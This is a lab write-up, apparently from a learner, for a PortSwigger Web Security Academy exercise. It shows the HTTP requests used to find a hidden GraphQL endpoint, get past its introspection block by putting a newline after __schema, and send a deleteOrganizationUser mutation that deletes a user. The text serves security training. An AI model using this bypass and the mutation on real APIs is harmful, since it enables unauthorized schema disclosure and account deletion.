# Lab: Finding a hidden GraphQL endpoint

### Objective
```
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete `carlos`.
```

1. Because the end point would not be discover-able by conventional means, (cruising the app),
I decided to run an active scan to see if that could discover an api endpoint it up, and it did.
**Request**
```HTTP
GET /api?query=query%7b__typename%7d HTTP/2
Host: 0a7500a5048f1d4881dc76a500e100e4.web-security-academy.net
Cookie: session=GK55sNu9PbFaURJWf1TqFc6bf1znx72m
```

**Response**
```HTTP
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=CURbdf77YeLW6ItMRlsFyYaPT20EQJeU; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{
  "data": {
    "__typename": "query"
  }
}
```

2. **Sent it to Repeater**
and and copy-pasted the request query to the decoder:
```HTTP
GET /api?query=query%7b__schema%0a+%7bqueryType%7bname%7d%7d%7d
```

the decoded query:
```HTTP
/api?query=query{__schema {queryType{name}}}
```

OK, cool, let's send the request in repeater:
**Request**
```HTTP
GET /api?query=query%7b__schema%0a+%7bqueryType%7bname%7d%7d%7d HTTP/2
Host: 0a7500a5048f1d4881dc76a500e100e4.web-security-academy.net
Cookie: session=GK55sNu9PbFaURJWf1TqFc6bf1znx72m
```

**Response**
```HTTP
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=VILmNREKQeZDDXaIDSBj9llyNeJ0KDwt; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

3. Ok, looks like I'm going to have to find a way to augment this request to uncover some hidden info
Remember, the instructions said:
```
The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete `carlos`.
```

This is where I hit a wall, so I checked PortSwigger's article on [Bypassing GraphQL introspection defenses](https://portswigger.net/web-security/graphql#finding-graphql-endpoints)

---
## But first, lets make sure we understand what introspection.

**" Introspection is a feature in GraphQL that allows it to describe it's own data to the client "**

**" Introspection let's clients query a GraphQL Server for info about it's
underlying schema, which includes data such as queries, mutations, subscriptions,
directives, types, fields, and more. "**

**" Introspection provides access to information about queries, mutations,
subscriptions, fields, objects, and so on through the  ` __schema`  meta-field. This
can be abused to disclose info about the app's schema. "**
 
**- _Black Hat GraphQL, Next Generation APIs_**
`pages 33, 63, 99`


**" Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.** 
**Like regular queries, you can specify the fields and structure of the response you want to be returned.** 

**For example, you might want the response to only contain the names of available mutations.
Introspection can represent a serious information disclosure risk, as it can be
used to access potentially sensitive information (such as field descriptions)
and help an attacker to learn how they can interact with the API. It is best
practice for introspection to be disabled in production environments. "**
[PortSwigger, what is graphql introspection](https://portswigger.net/web-security/graphql/what-is-graphql#introspection)

---


**Thinking that maybe I could use PortSwigger's example as a way to figure this out
The bit about bypassing GraphQL introspection defenses says:**

## Bypassing GraphQL introspection defenses

If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.

**!!!!! When developers disable introspection, they could use a regex to exclude the
`__schema` keyword in queries. You should try characters like spaces, 
_new lines, 
and commas, as they are ignored by GraphQL but not by flawed regex.**

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

**Introspection query with newline** 
```
{ 
	"query": "query{__schema 
	{queryType{name}}}" 

}
```

This is neat, but looks like I'm back to step 3 in this process:
#### _" Find a way to augment this request to uncover some hidden info 

It turns out that:
`GET /api?query=query%7b__typename%7d`
`GET /api?query=query{__typename}`

And is only useable with GET requests and not POST, (for now)
And the response confirms that this is a GraphQL endpoint
```
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

**Now need to find a way to bypass the introspection defenses**

1. Send a new request with a URL-encoded introspection query as a query parameter.
To do this, right-click the request and select **GraphQL > Set introspection query**:

**The query**
```
/api?query=query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }

```

URL Encoded as a query in the URL
```HTTP
/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

2. Response says introspection disallowed
3. Modify the query to **include a newline character after `__schema` and resend.
```
  __schema
 {
    queryType {
```
VS
```
__schema {
    queryType {
```


For example:
```
/api?query=query IntrospectionQuery {
  __schema
 {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}

```


Encoded URL query
```HTTP
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

4. Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query.


**Now Exploit the vulnerability**

1. Right-click the request and select **GraphQL > Save GraphQL queries to site map**.
    
2. Go to **Target > Site map** to see the API queries. Use the **GraphQL** tab and find the `getUser` query. Right-click the request and select **Send to Repeater**.
    
3. In Repeater, send the `getUser` query to the endpoint you discovered.
    
    Notice that the response returns:
```JSON
{ "data": { 
"getUser": null 
} 
}
```

4.  Click on the GraphQL tab and change the `id` variable to find `carlos`'s user ID. In this case, the relevant user ID is `3`.
    
3. In **Target > Site map**, browse the schema again and find the `deleteOrganizationUser` mutation. Notice that this mutation takes a user ID as a parameter.
    
4. Send the request to Repeater.
    
5. In Repeater, send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos` and solve the lab.

For example:
```HTTP
/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
```
